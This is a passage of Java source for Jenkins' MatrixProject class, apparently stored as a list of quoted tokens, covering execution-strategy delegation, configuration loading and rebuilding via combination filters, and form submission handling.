"}", "return", "null", ";", "}", "/", "**", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Use", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "#", "setSorter", "(", "MatrixConfigurationSorter", ")", "}.", "*", "This", "method", "tries", "to", "emulate", "the", "previous", "behavior", "the", "best", "it", "can", ",", "but", "will", "fall", "back", "*", "to", "no", "-", "op", "if", "the", "current", "{", "@", "link", "MatrixExecutionStrategy", "}", "is", "not", "the", "default", "one", ".", "*", "/", "public", "void", "setSorter", "(", "MatrixConfigurationSorter", "sorter", ")", "throws", "IOException", "{", "MatrixExecutionStrategy", "e", "=", "executionStrategy", ";", "if", "(", "e", "instanceof", "DefaultMatrixExecutionStrategyImpl", ")", "{", "DefaultMatrixExecutionStrategyImpl", "dm", "=", "(", "DefaultMatrixExecutionStrategyImpl", ")", "e", ";", "dm", ".", "setSorter", "(", "sorter", ")", ";", "save", "(", ");", "}", "}", "public", "AxisList", "getAxes", "(", ")", "{", "return", "axes", ";", "}", "/", "**", "*", "Reconfigures", "axes", ".", "*", "/", "public", "void", "setAxes", "(", "AxisList", "axes", ")", "throws", "IOException", "{", "this", ".", "axes", "=", "new", "AxisList", "(", "axes", ")", ";", "rebuildConfigurations", "(", "null", ")", ";", "save", "(", ");", "}", "public", "MatrixExecutionStrategy", "getExecutionStrategy", "(", ")", "{", "return", "executionStrategy", ";", "}", "public", "void", "setExecutionStrategy", "(", "MatrixExecutionStrategy", "executionStrategy", ")", "throws", "IOException", "{", "if", "(", "executionStrategy", "=", "=", "null", ")", "throw", "new", "IllegalArgumentException", "(", ");", "this", ".", "executionStrategy", "=", "executionStrategy", ";", "save", "(", ");", "}", "/", "**", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Use", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "#", "isRunSequentially", "(", ")}", ".", "*", "This", "method", "tries", "to", "emulate", "the", "previous", "behavior", "the", "best", "it", "can", ",", "but", "will", "return", "false", "*", "if", "the", "current", "{", "@", "link", "MatrixExecutionStrategy", "}", "is", "not", "the", "default", "one", ".", "*", "/", "public", "boolean", "isRunSequentially", "(", ")", "{", "MatrixExecutionStrategy", "e", "=", "executionStrategy", ";", "if", "(", "e", "instanceof", "DefaultMatrixExecutionStrategyImpl", ")", "{", "DefaultMatrixExecutionStrategyImpl", "dm", "=", "(", "DefaultMatrixExecutionStrategyImpl", ")", "e", ";", "return", "dm", ".", "isRunSequentially", "(", ");", "}", "return", "false", ";", "}", "/", "**", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Use", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "#", "setRunSequentially", "(", "boolean", ")", "}.", "*", "This", "method", "tries", "to", "emulate", "the", "previous", "behavior", "the", "best", "it", "can", ",", "but", "will", "fall", "back", "*", "to", "no", "-", "op", "if", "the", "current", "{", "@", "link", "MatrixExecutionStrategy", "}", "is", "not", "the", "default", "one", ".", "*", "/", "public", "void", "setRunSequentially", "(", "boolean", "runSequentially", ")", "throws", "IOException", "{", "MatrixExecutionStrategy", "e", "=", "executionStrategy", ";", "if", "(", "e", "instanceof", "DefaultMatrixExecutionStrategyImpl", ")", "{", "DefaultMatrixExecutionStrategyImpl", "dm", "=", "(", "DefaultMatrixExecutionStrategyImpl", ")", "e", ";", "dm", ".", "setRunSequentially", "(", "runSequentially", ")", ";", "save", "(", ");", "}", "}", "/", "**", "*", "Sets", "the", "combination", "filter", ".", "*", "*", "@", "param", "combinationFilter", "the", "combinationFilter", "to", "set", "*", "/", "public", "void", "setCombinationFilter", "(", "String", "combinationFilter", ")", "throws", "IOException", "{", "this", ".", "combinationFilter", "=", "combinationFilter", ";", "rebuildConfigurations", "(", "null", ")", ";", "save", "(", ");", "}", "/", "**", "*", "Obtains", "the", "combination", "filter", ",", "used", "to", "trim", "down", "the", "size", "of", "the", "matrix", ".", "*", "*", "<", "p", ">", "*", "By", "default", ",", "a", "{", "@", "link", "MatrixConfiguration", "}", "is", "created", "for", "every", "possible", "combination", "of", "axes", "exhaustively", ".", "*", "But", "by", "specifying", "a", "Groovy", "expression", "as", "a", "combination", "filter", ",", "one", "can", "trim", "down", "the", "#", "of", "combinations", "built", ".", "*", "*", "<", "p", ">", "*", "Namely", ",", "this", "expression", "is", "evaluated", "for", "each", "axis", "value", "combination", ",", "and", "only", "when", "it", "evaluates", "to", "true", ",", "*", "a", "corresponding", "{", "@", "link", "MatrixConfiguration", "}", "will", "be", "created", "and", "built", ".", "*", "*", "@", "return", "can", "be", "null", ".", "*", "@", "since", "1", ".", "279", "*", "/", "public", "String", "getCombinationFilter", "(", ")", "{", "return", "combinationFilter", ";", "}", "/", "**", "*", "@", "return", "can", "be", "null", "(", "to", "indicate", "that", "the", "configurations", "should", "be", "left", "to", "their", "natural", "order", ".", ")", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Use", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "#", "getTouchStoneCombinationFilter", "(", ")}", ".", "*", "This", "method", "tries", "to", "emulate", "the", "previous", "behavior", "the", "best", "it", "can", ",", "but", "will", "return", "null", "*", "if", "the", "current", "{", "@", "link", "MatrixExecutionStrategy", "}", "is", "not", "the", "default", "one", ".", "*", "/", "public", "String", "getTouchStoneCombinationFilter", "(", ")", "{", "MatrixExecutionStrategy", "e", "=", "executionStrategy", ";", "if", "(", "e", "instanceof", "DefaultMatrixExecutionStrategyImpl", ")", "{", "DefaultMatrixExecutionStrategyImpl", "dm", "=", "(", "DefaultMatrixExecutionStrategyImpl", ")", "e", ";", "return", "dm", ".", "getTouchStoneCombinationFilter", "(", ");", "}", "return", "null", ";", "}", "/", "**", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Use", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "#", "setTouchStoneCombinationFilter", "(", "String", ")", "}.", "*", "This", "method", "tries", "to", "emulate", "the", "previous", "behavior", "the", "best", "it", "can", ",", "but", "will", "fall", "back", "*", "to", "no", "-", "op", "if", "the", "current", "{", "@", "link", "MatrixExecutionStrategy", "}", "is", "not", "the", "default", "one", ".", "*", "/", "public", "void", "setTouchStoneCombinationFilter", "(", "String", "touchStoneCombinationFilter", ")", "throws", "IOException", "{", "MatrixExecutionStrategy", "e", "=", "executionStrategy", ";", "if", "(", "e", "instanceof", "DefaultMatrixExecutionStrategyImpl", ")", "{", "DefaultMatrixExecutionStrategyImpl", "dm", "=", "(", "DefaultMatrixExecutionStrategyImpl", ")", "e", ";", "dm", ".", "setTouchStoneCombinationFilter", "(", "touchStoneCombinationFilter", ")", ";", "save", "(", ");", "}", "}", "/", "**", "*", "@", "return", "can", "be", "null", "(", "to", "indicate", "that", "the", "configurations", "should", "be", "left", "to", "their", "natural", "order", ".", ")", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Use", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "#", "getTouchStoneResultCondition", "(", ")}", ".", "*", "This", "method", "tries", "to", "emulate", "the", "previous", "behavior", "the", "best", "it", "can", ",", "but", "will", "return", "null", "*", "if", "the", "current", "{", "@", "link", "MatrixExecutionStrategy", "}", "is", "not", "the", "default", "one", ".", "*", "/", "public", "Result", "getTouchStoneResultCondition", "(", ")", "{", "MatrixExecutionStrategy", "e", "=", "executionStrategy", ";", "if", "(", "e", "instanceof", "DefaultMatrixExecutionStrategyImpl", ")", "{", "DefaultMatrixExecutionStrategyImpl", "dm", "=", "(", "DefaultMatrixExecutionStrategyImpl", ")", "e", ";", "return", "dm", ".", "getTouchStoneResultCondition", "(", ");", "}", "return", "null", ";", "}", "/", "**", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "Use", "{", "@", "link", "DefaultMatrixExecutionStrategyImpl", "#", "setTouchStoneResultCondition", "(", "Result", ")", "}.", "*", "This", "method", "tries", "to", "emulate", "the", "previous", "behavior", "the", "best", "it", "can", ",", "but", "will", "fall", "back", "*", "to", "no", "-", "op", "if", "the", "current", "{", "@", "link", "MatrixExecutionStrategy", "}", "is", "not", "the", "default", "one", ".", "*", "/", "public", "void", "setTouchStoneResultCondition", "(", "Result", "touchStoneResultCondition", ")", "throws", "IOException", "{", "MatrixExecutionStrategy", "e", "=", "executionStrategy", ";", "if", "(", "e", "instanceof", "DefaultMatrixExecutionStrategyImpl", ")", "{", "DefaultMatrixExecutionStrategyImpl", "dm", "=", "(", "DefaultMatrixExecutionStrategyImpl", ")", "e", ";", "dm", ".", "setTouchStoneResultCondition", "(", "touchStoneResultCondition", ")", ";", "save", "(", ");", "}", "}", "@", "Override", "protected", "List", "<", "Action", ">", "createTransientActions", "(", ")", "{", "List", "<", "Action", ">", "r", "=", "super", ".", "createTransientActions", "(", ");", "for", "(", "BuildStep", "step", ":", "builders", ")", "r", ".", "addAll", "(", "step", ".", "getProjectActions", "(", "this", ")", ");", "for", "(", "BuildStep", "step", ":", "publishers", ")", "r", ".", "addAll", "(", "step", ".", "getProjectActions", "(", "this", ")", ");", "for", "(", "BuildWrapper", "step", ":", "buildWrappers", ")", "r", ".", "addAll", "(", "step", ".", "getProjectActions", "(", "this", ")", ");", "for", "(", "Trigger", "<", "?>", "trigger", ":", "triggers", "(", "))", "r", ".", "addAll", "(", "trigger", ".", "getProjectActions", "(", "))", ";", "return", "r", ";", "}", "@", "Override", "protected", "void", "updateTransientActions", "(", "){", "super", ".", "updateTransientActions", "(", ");", "if", "(", "getActiveConfigurations", "(", ")", "!", "=", "null", ")", "{", "/", "/", "update", "all", "transient", "actions", "in", "configurations", "too", ".", "for", "(", "MatrixConfiguration", "configuration", ":", "getActiveConfigurations", "(", "))", "{", "configuration", ".", "updateTransientActions", "(", ");", "}", "}", "}", "/", "**", "*", "Gets", "the", "subset", "of", "{", "@", "link", "AxisList", "}", "that", "are", "not", "system", "axes", ".", "*", "*", "@", "deprecated", "as", "of", "1", ".", "373", "*", "System", "vs", "user", "difference", "are", "generalized", "into", "extension", "point", ".", "*", "/", "public", "List", "<", "Axis", ">", "getUserAxes", "(", ")", "{", "List", "<", "Axis", ">", "r", "=", "new", "ArrayList", "<", "Axis", ">", "()", ";", "for", "(", "Axis", "a", ":", "axes", ")", "if", "(", "!", "a", ".", "isSystem", "(", "))", "r", ".", "add", "(", "a", ")", ";", "return", "r", ";", "}", "public", "Layouter", "<", "MatrixConfiguration", ">", "getLayouter", "(", ")", "{", "return", "new", "Layouter", "<", "MatrixConfiguration", ">", "(", "axes", ")", "{", "protected", "MatrixConfiguration", "getT", "(", "Combination", "c", ")", "{", "return", "getItem", "(", "c", ")", ";", "}", "}", ";", "}", "@", "Override", "public", "void", "onCreatedFromScratch", "(", ")", "{", "executionStrategy", "=", "new", "DefaultMatrixExecutionStrategyImpl", "(", ");", "super", ".", "onCreatedFromScratch", "(", ");", "}", "@", "Override", "public", "void", "onLoad", "(", "ItemGroup", "<", "?", "extends", "Item", ">", "parent", ",", "String", "name", ")", "throws", "IOException", "{", "super", ".", "onLoad", "(", "parent", ",", "name", ")", ";", "builders", ".", "setOwner", "(", "this", ")", ";", "publishers", ".", "setOwner", "(", "this", ")", ";", "buildWrappers", ".", "setOwner", "(", "this", ")", ";", "if", "(", "executionStrategy", "=", "=", "null", ")", "executionStrategy", "=", "new", "DefaultMatrixExecutionStrategyImpl", "(", "runSequentially", "!", "=", "null", "?", "runSequentially", ":", "false", ",", "touchStoneCombinationFilter", ",", "touchStoneResultCondition", ",", "sorter", ")", ";", "rebuildConfigurations", "(", "null", ")", ";", "}", "@", "Override", "public", "void", "logRotate", "(", ")", "throws", "IOException", ",", "InterruptedException", "{", "super", ".", "logRotate", "(", ");", "/", "/", "perform", "the", "log", "rotation", "of", "inactive", "configurations", "to", "make", "sure", "/", "/", "their", "logs", "get", "eventually", "discarded", "for", "(", "MatrixConfiguration", "config", ":", "configurations", ".", "values", "(", "))", "{", "if", "(", "!", "config", ".", "isActiveConfiguration", "(", "))", "config", ".", "logRotate", "(", ");", "}", "}", "/", "**", "*", "Recursively", "search", "for", "configuration", "and", "put", "them", "to", "the", "map", "*", "*", "<", "p", ">", "*", "The", "directory", "structure", "would", "be", "<", "tt", ">", "axis", "-", "a", "/", "b", "/", "axis", "-", "c", "/", "d", "/", "axis", "-", "e", "/", "f", "<", "/", "tt", ">", "for", "*", "combination", "[", "a", "=", "b", ",", "c", "=", "d", ",", "e", "=", "f", "]", ".", "Note", "that", "two", "combinations", "[", "a", "=", "b", ",", "c", "=", "d", "]", "and", "[", "a", "=", "b", ",", "c", "=", "d", ",", "e", "=", "f", "]", "*", "can", "both", "co", "-", "exist", "(", "where", "one", "is", "an", "archived", "record", "and", "the", "other", "is", "live", ",", "for", "example", ")", "*", "so", "search", "needs", "to", "be", "thorough", ".", "*", "*", "@", "param", "dir", "*", "Directory", "to", "be", "searched", ".", "*", "@", "param", "result", "*", "Receives", "the", "loaded", "{", "@", "link", "MatrixConfiguration", "}", "s", ".", "*", "@", "param", "combination", "*", "Combination", "of", "key", "/", "values", "discovered", "so", "far", "while", "traversing", "the", "directories", ".", "*", "Read", "-", "only", ".", "*", "/", "private", "void", "loadConfigurations", "(", "File", "dir", ",", "CopyOnWriteMap", ".", "Tree", "<", "Combination", ",", "MatrixConfiguration", ">", "result", ",", "Map", "<", "String", ",", "String", ">", "combination", ")", "{", "File", "[", "]", "axisDirs", "=", "dir", ".", "listFiles", "(", "new", "FileFilter", "(", ")", "{", "public", "boolean", "accept", "(", "File", "child", ")", "{", "return", "child", ".", "isDirectory", "(", ")", "&", "&", "child", ".", "getName", "(", ").", "startsWith", "(", "\"", "axis", "-", "\")", ";", "}", "}", ");", "if", "(", "axisDirs", "=", "=", "null", ")", "return", ";", "for", "(", "File", "subdir", ":", "axisDirs", ")", "{", "String", "axis", "=", "subdir", ".", "getName", "(", ").", "substring", "(", "5", ")", ";", "/", "/", "axis", "name", "File", "[", "]", "valuesDir", "=", "subdir", ".", "listFiles", "(", "new", "FileFilter", "(", ")", "{", "public", "boolean", "accept", "(", "File", "child", ")", "{", "return", "child", ".", "isDirectory", "(", ");", "}", "}", ");", "if", "(", "valuesDir", "=", "=", "null", ")", "continue", ";", "/", "/", "no", "values", "here", "for", "(", "File", "v", ":", "valuesDir", ")", "{", "Map", "<", "String", ",", "String", ">", "c", "=", "new", "HashMap", "<", "String", ",", "String", ">", "(", "combination", ")", ";", "c", ".", "put", "(", "axis", ",", "TokenList", ".", "decode", "(", "v", ".", "getName", "(", "))", ");", "try", "{", "XmlFile", "config", "=", "Items", ".", "getConfigFile", "(", "v", ")", ";", "if", "(", "config", ".", "exists", "(", "))", "{", "Combination", "comb", "=", "new", "Combination", "(", "c", ")", ";", "/", "/", "if", "we", "already", "have", "this", "in", "memory", ",", "just", "use", "it", ".", "/", "/", "otherwise", "load", "it", "MatrixConfiguration", "item", "=", "null", ";", "if", "(", "this", ".", "configurations", "!", "=", "null", ")", "item", "=", "this", ".", "configurations", ".", "get", "(", "comb", ")", ";", "if", "(", "item", "=", "=", "null", ")", "{", "item", "=", "(", "MatrixConfiguration", ")", "config", ".", "read", "(", ");", "item", ".", "setCombination", "(", "comb", ")", ";", "item", ".", "onLoad", "(", "this", ",", "v", ".", "getName", "(", "))", ";", "}", "result", ".", "put", "(", "item", ".", "getCombination", "(", "),", "item", ")", ";", "}", "}", "catch", "(", "IOException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Failed", "to", "load", "matrix", "configuration", "\"", "+", "v", ",", "e", ")", ";", "}", "loadConfigurations", "(", "v", ",", "result", ",", "c", ")", ";", "}", "}", "}", "/", "**", "*", "Rebuilds", "the", "{", "@", "link", "#", "configurations", "}", "list", "and", "{", "@", "link", "#", "activeConfigurations", "}", ".", "*", "*", "@", "param", "context", "*", "We", "rebuild", "configurations", "right", "before", "a", "build", ",", "to", "allow", "configurations", "to", "be", "adjusted", "for", "the", "build", ".", "*", "(", "think", "of", "it", "as", "reconfiguring", "a", "project", "right", "before", "a", "build", ".", ")", "And", "when", "that", "happens", ",", "this", "value", "is", "the", "*", "build", "in", "progress", ".", "Otherwise", "this", "value", "is", "null", "(", "for", "example", ",", "when", "Jenkins", "is", "booting", "up", ".", ")", "*", "/", "/", "*", "package", "*", "/", "Set", "<", "MatrixConfiguration", ">", "rebuildConfigurations", "(", "MatrixBuildExecution", "context", ")", "throws", "IOException", "{", "{", "/", "/", "backward", "compatibility", "check", "to", "see", "if", "there", "'", "s", "any", "data", "in", "the", "old", "structure", "/", "/", "if", "so", ",", "bring", "them", "to", "the", "newer", "structure", ".", "File", "[", "]", "oldDirs", "=", "getConfigurationsDir", "(", ").", "listFiles", "(", "new", "FileFilter", "(", ")", "{", "public", "boolean", "accept", "(", "File", "child", ")", "{", "return", "child", ".", "isDirectory", "(", ")", "&", "&", "!", "child", ".", "getName", "(", ").", "startsWith", "(", "\"", "axis", "-", "\")", ";", "}", "}", ");", "if", "(", "oldDirs", "!", "=", "null", ")", "{", "/", "/", "rename", "the", "old", "directory", "to", "the", "new", "one", "for", "(", "File", "dir", ":", "oldDirs", ")", "{", "try", "{", "Combination", "c", "=", "Combination", ".", "fromString", "(", "dir", ".", "getName", "(", "))", ";", "dir", ".", "renameTo", "(", "getRootDirFor", "(", "c", ")", ");", "}", "catch", "(", "IllegalArgumentException", "e", ")", "{", "/", "/", "it", "'", "s", "not", "a", "configuration", "dir", ".", "Just", "ignore", ".", "}", "}", "}", "}", "CopyOnWriteMap", ".", "Tree", "<", "Combination", ",", "MatrixConfiguration", ">", "configurations", "=", "new", "CopyOnWriteMap", ".", "Tree", "<", "Combination", ",", "MatrixConfiguration", ">", "()", ";", "loadConfigurations", "(", "getConfigurationsDir", "(", "),", "configurations", ",", "Collections", ".", "<", "String", ",", "String", ">", "emptyMap", "(", "))", ";", "this", ".", "configurations", "=", "configurations", ";", "Iterable", "<", "Combination", ">", "activeCombinations", ";", "if", "(", "context", "!", "=", "null", ")", "{", "List", "<", "Set", "<", "String", ">", ">", "axesList", "=", "Lists", ".", "newArrayList", "(", ");", "for", "(", "Axis", "axis", ":", "axes", ")", "axesList", ".", "add", "(", "Sets", ".", "newLinkedHashSet", "(", "axis", ".", "rebuild", "(", "context", ")", "))", ";", "activeCombinations", "=", "Iterables", ".", "transform", "(", "Sets", ".", "cartesianProduct", "(", "axesList", ")", ",", "new", "Function", "<", "List", "<", "String", ">", ",", "Combination", ">", "()", "{", "public", "Combination", "apply", "(", "@", "Nullable", "List", "<", "String", ">", "strings", ")", "{", "assert", "strings", "!", "=", "null", ";", "return", "new", "Combination", "(", "axes", ",", "(", "String", "[", "])", "strings", ".", "toArray", "(", "new", "String", "[", "0", "]", "))", ";", "}", "}", ");", "}", "else", "{", "activeCombinations", "=", "axes", ".", "list", "(", ");", "}", "/", "/", "find", "all", "active", "configurations", "final", "Set", "<", "MatrixConfiguration", ">", "active", "=", "new", "LinkedHashSet", "<", "MatrixConfiguration", ">", "()", ";", "final", "boolean", "isDynamicFilter", "=", "isDynamicFilter", "(", "getCombinationFilter", "(", "))", ";", "for", "(", "Combination", "c", ":", "activeCombinations", ")", "{", "if", "(", "isDynamicFilter", "|", "|", "c", ".", "evalGroovyExpression", "(", "axes", ",", "getCombinationFilter", "(", "))", ")", "{", "LOGGER", ".", "fine", "(", "\"", "Adding", "configuration", ":", "\"", "+", "c", ")", ";", "MatrixConfiguration", "config", "=", "configurations", ".", "get", "(", "c", ")", ";", "if", "(", "config", "=", "=", "null", ")", "{", "config", "=", "new", "MatrixConfiguration", "(", "this", ",", "c", ")", ";", "config", ".", "onCreatedFromScratch", "(", ");", "config", ".", "save", "(", ");", "configurations", ".", "put", "(", "config", ".", "getCombination", "(", "),", "config", ")", ";", "}", "active", ".", "add", "(", "config", ")", ";", "}", "}", "this", ".", "activeConfigurations", "=", "active", ";", "return", "active", ";", "}", "private", "boolean", "isDynamicFilter", "(", "final", "String", "filter", ")", "{", "if", "(", "!", "isParameterized", "(", ")", "|", "|", "filter", "=", "=", "null", ")", "return", "false", ";", "final", "ParametersDefinitionProperty", "paramDefProp", "=", "getProperty", "(", "ParametersDefinitionProperty", ".", "class", ")", ";", "for", "(", "final", "ParameterDefinition", "definition", ":", "paramDefProp", ".", "getParameterDefinitions", "(", "))", "{", "final", "String", "name", "=", "definition", ".", "getName", "(", ");", "final", "Matcher", "matcher", "=", "Pattern", ".", "compile", "(", "\"\\", "\\", "b", "\"", "+", "name", "+", "\"", "\\\\", "b", "\"", ")", ".", "matcher", "(", "filter", ")", ";", "if", "(", "matcher", ".", "find", "(", "))", "return", "true", ";", "}", "return", "false", ";", "}", "private", "File", "getConfigurationsDir", "(", ")", "{", "return", "new", "File", "(", "getRootDir", "(", "),", "\"", "configurations", "\"", ");", "}", "/", "**", "*", "Gets", "all", "active", "configurations", ".", "*", "*", "<", "p", ">", "*", "In", "contract", ",", "inactive", "configurations", "are", "those", "that", "are", "left", "for", "archival", "purpose", "*", "and", "no", "longer", "built", "when", "a", "new", "{", "@", "link", "MatrixBuild", "}", "is", "executed", ".", "*", "*", "<", "p", ">", "*", "During", "a", "build", ",", "{", "@", "link", "MatrixBuildExecution", "#", "getActiveConfigurations", "(", ")}", "should", "be", "used", "*", "to", "make", "sure", "that", "a", "build", "is", "using", "the", "consistent", "set", "of", "active", "configurations", "from", "*", "the", "start", "to", "the", "end", ".", "*", "/", "@", "Exported", "public", "Collection", "<", "MatrixConfiguration", ">", "getActiveConfigurations", "(", ")", "{", "return", "activeConfigurations", ";", "}", "public", "Collection", "<", "MatrixConfiguration", ">", "getItems", "(", ")", "{", "return", "configurations", ".", "values", "(", ");", "}", "@", "Override", "public", "Collection", "<", "?", "extends", "Job", ">", "getAllJobs", "(", ")", "{", "Set", "<", "Job", ">", "jobs", "=", "new", "HashSet", "<", "Job", ">", "(", "getItems", "(", "))", ";", "jobs", ".", "add", "(", "this", ")", ";", "return", "jobs", ";", "}", "public", "String", "getUrlChildPrefix", "(", ")", "{", "return", "\"", ".\"", ";", "}", "public", "MatrixConfiguration", "getItem", "(", "String", "name", ")", "{", "try", "{", "return", "getItem", "(", "Combination", ".", "fromString", "(", "name", ")", ");", "}", "catch", "(", "IllegalArgumentException", "e", ")", "{", "return", "null", ";", "}", "}", "public", "MatrixConfiguration", "getItem", "(", "Combination", "c", ")", "{", "if", "(", "configurations", "=", "=", "null", ")", "{", "return", "null", ";", "}", "return", "configurations", ".", "get", "(", "c", ")", ";", "}", "public", "File", "getRootDirFor", "(", "MatrixConfiguration", "child", ")", "{", "return", "getRootDirFor", "(", "child", ".", "getCombination", "(", "))", ";", "}", "public", "void", "onRenamed", "(", "MatrixConfiguration", "item", ",", "String", "oldName", ",", "String", "newName", ")", "throws", "IOException", "{", "throw", "new", "UnsupportedOperationException", "(", ");", "}", "public", "void", "onDeleted", "(", "MatrixConfiguration", "item", ")", "throws", "IOException", "{", "/", "/", "noop", "}", "public", "File", "getRootDirFor", "(", "Combination", "combination", ")", "{", "File", "f", "=", "getConfigurationsDir", "(", ");", "for", "(", "Entry", "<", "String", ",", "String", ">", "e", ":", "combination", ".", "entrySet", "(", "))", "f", "=", "new", "File", "(", "f", ",", "\"", "axis", "-", "\"+", "e", ".", "getKey", "(", ")+", "'/", "'+", "Util", ".", "rawEncode", "(", "e", ".", "getValue", "(", "))", ");", "f", ".", "getParentFile", "(", ").", "mkdirs", "(", ");", "return", "f", ";", "}", "/", "**", "*", "@", "see", "#", "getJDKs", "(", ")", "*", "/", "@", "Override", "@", "Deprecated", "public", "JDK", "getJDK", "(", ")", "{", "return", "super", ".", "getJDK", "(", ");", "}", "/", "**", "*", "Gets", "the", "{", "@", "link", "JDK", "}", "s", "where", "the", "builds", "will", "be", "run", ".", "*", "@", "return", "never", "null", "but", "can", "be", "empty", "*", "/", "public", "Set", "<", "JDK", ">", "getJDKs", "(", ")", "{", "Axis", "a", "=", "axes", ".", "find", "(", "\"", "jdk", "\"", ");", "if", "(", "a", "=", "=", "null", ")", "return", "Collections", ".", "emptySet", "(", ");", "Set", "<", "JDK", ">", "r", "=", "new", "HashSet", "<", "JDK", ">", "()", ";", "for", "(", "String", "j", ":", "a", ")", "{", "JDK", "jdk", "=", "Jenkins", ".", "getInstance", "(", ").", "getJDK", "(", "j", ")", ";", "if", "(", "jdk", "!", "=", "null", ")", "r", ".", "add", "(", "jdk", ")", ";", "}", "return", "r", ";", "}", "/", "**", "*", "Gets", "the", "{", "@", "link", "Label", "}", "s", "where", "the", "builds", "will", "be", "run", ".", "*", "@", "return", "never", "null", "*", "/", "public", "Set", "<", "Label", ">", "getLabels", "(", ")", "{", "Set", "<", "Label", ">", "r", "=", "new", "HashSet", "<", "Label", ">", "()", ";", "for", "(", "Combination", "c", ":", "axes", ".", "subList", "(", "LabelAxis", ".", "class", ")", ".", "list", "(", "))", "r", ".", "add", "(", "Jenkins", ".", "getInstance", "(", ").", "getLabel", "(", "Util", ".", "join", "(", "c", ".", "values", "(", "),", "\"&", "&\"", "))", ");", "return", "r", ";", "}", "public", "List", "<", "Builder", ">", "getBuilders", "(", ")", "{", "return", "builders", ".", "toList", "(", ");", "}", "public", "DescribableList", "<", "Builder", ",", "Descriptor", "<", "Builder", ">", ">", "getBuildersList", "(", ")", "{", "return", "builders", ";", "}", "public", "Map", "<", "Descriptor", "<", "Publisher", ">", ",", "Publisher", ">", "getPublishers", "(", ")", "{", "return", "publishers", ".", "toMap", "(", ");", "}", "public", "DescribableList", "<", "Publisher", ",", "Descriptor", "<", "Publisher", ">", ">", "getPublishersList", "(", ")", "{", "return", "publishers", ";", "}", "public", "DescribableList", "<", "BuildWrapper", ",", "Descriptor", "<", "BuildWrapper", ">", ">", "getBuildWrappersList", "(", ")", "{", "return", "buildWrappers", ";", "}", "public", "Map", "<", "Descriptor", "<", "BuildWrapper", ">", ",", "BuildWrapper", ">", "getBuildWrappers", "(", ")", "{", "return", "buildWrappers", ".", "toMap", "(", ");", "}", "public", "Publisher", "getPublisher", "(", "Descriptor", "<", "Publisher", ">", "descriptor", ")", "{", "for", "(", "Publisher", "p", ":", "publishers", ")", "{", "if", "(", "p", ".", "getDescriptor", "(", ")=", "=", "descriptor", ")", "return", "p", ";", "}", "return", "null", ";", "}", "protected", "Class", "<", "MatrixBuild", ">", "getBuildClass", "(", ")", "{", "return", "MatrixBuild", ".", "class", ";", "}", "public", "boolean", "isFingerprintConfigured", "(", ")", "{", "return", "false", ";", "}", "protected", "void", "buildDependencyGraph", "(", "DependencyGraph", "graph", ")", "{", "publishers", ".", "buildDependencyGraph", "(", "this", ",", "graph", ")", ";", "builders", ".", "buildDependencyGraph", "(", "this", ",", "graph", ")", ";", "buildWrappers", ".", "buildDependencyGraph", "(", "this", ",", "graph", ")", ";", "}", "public", "MatrixProject", "asProject", "(", ")", "{", "return", "this", ";", "}", "@", "Override", "public", "Object", "getDynamic", "(", "String", "token", ",", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "{", "try", "{", "MatrixConfiguration", "item", "=", "getItem", "(", "token", ")", ";", "if", "(", "item", "!", "=", "null", ")", "return", "item", ";", "}", "catch", "(", "IllegalArgumentException", "_", ")", "{", "/", "/", "failed", "to", "parse", "the", "token", "as", "Combination", ".", "Must", "be", "something", "else", "}", "return", "super", ".", "getDynamic", "(", "token", ",", "req", ",", "rsp", ")", ";", "}", "@", "Override", "protected", "void", "submit", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOException", ",", "ServletException", ",", "FormException", "{", "super", ".", "submit", "(", "req", ",", "rsp", ")", ";", "JSONObject", "json", "=", "req", ".", "getSubmittedForm", "(", ");", "if", "(", "req", ".", "getParameter", "(", "\"", "hasCombinationFilter", "\"", ")!", "=", "null", ")", "{", "this", ".", "combinationFilter", "=", "Util", ".", "nullify", "(", "req", ".", "getParameter", "(", "\"", "combinationFilter", "\"", "))", ";", "}", "else", "{", "this", ".", "combinationFilter", "=", "null", ";", "}", "if", "(", "req", ".", "hasParameter", "(", "\"", "customWorkspace", "\"", "))", "{", "setChildCustomWorkspace", "(", "Util", ".", "fixEmptyAndTrim", "(", "req", ".", "getParameter", "(", "\"", "childCustomWorkspace", ".", "directory", "\"", "))", ");", "}", "else", "{", "setChildCustomWorkspace", "(", "null", ")", ";", "}", "List", "<", "MatrixExecutionStrategyDescriptor", ">", "esd", "=", "getDescriptor", "(", ").", "getExecutionStrategyDescriptors", "(", ");", "if", "(", "esd", ".", "size", "(", ")>", "1", ")", "executionStrategy", "=", "req", ".", "bindJSON", "(", "MatrixExecutionStrategy", ".", "class", ",", "json", ".", "getJSONObject", "(", "\"", "executionStrategy", "\"", "))", ";", "else", "executionStrategy", "=", "req", ".", "bindJSON", "(", "esd", ".", "get", "(", "0", ")", ".", "clazz", ",", "json", ".", "getJSONObject", "(", "\"", "executionStrategy", "\"", "))", ";", "/", "/", "parse", "system", "axes", "DescribableList", "<", "Axis", ",", "AxisDescriptor", ">", "newAxes", "=", "new", "DescribableList", "<", "Axis", ",", "AxisDescriptor", ">", "(", "this", ")", ";", "newAxes", ".", "rebuildHetero", "(", "req", ",", "json", ",", "Axis", ".", "all", "(", "),", "\"", "axis", "\"", ");", "checkAxisNames", "(", "newAxes", ")", ";", "this", ".", "axes", "=", "new", "AxisList", "(", "newAxes", ".", "toList", "(", "))", ";", "buildWrappers", ".", "rebuild", "(", "req", ",", "json", ",", "BuildWrappers", ".", "getFor", "(", "this", ")", ");", "builders", ".", "rebuildHetero", "(", "req", ",", "json", ",", "Builder", ".", "all", "(", "),", "\"", "builder", "\"", ");", "publishers", ".", "rebuildHetero", "(", "req", ",", "json", ",", "Publisher", ".", "all", "(", "),", "\"", "publisher", "\"", ");", 